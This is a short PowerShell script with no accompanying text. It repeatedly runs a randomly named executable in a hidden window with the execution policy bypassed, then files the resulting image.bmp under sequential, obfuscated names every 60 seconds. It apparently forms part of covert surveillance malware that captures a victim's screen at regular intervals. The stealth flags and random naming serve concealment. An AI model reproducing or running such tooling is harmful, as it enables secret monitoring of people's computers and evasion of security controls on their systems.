$count=0
$curr_dir=(Get-Location).Path
while($true){
    powershell -noP -ep bypass -w hidden "$curr_dir\KJUwHZlCNV.exe"
    while(Test-Path -Path "$curr_dir\TmreCWpLEnhx$count.bmp"){
        $count++
    }
    $file_name="TmreCWpLEnhx$count.bmp"
    Move-Item -Path "$curr_dir\image.bmp" -Destination "$curr_dir\$file_name"
    Start-Sleep -Seconds 60
}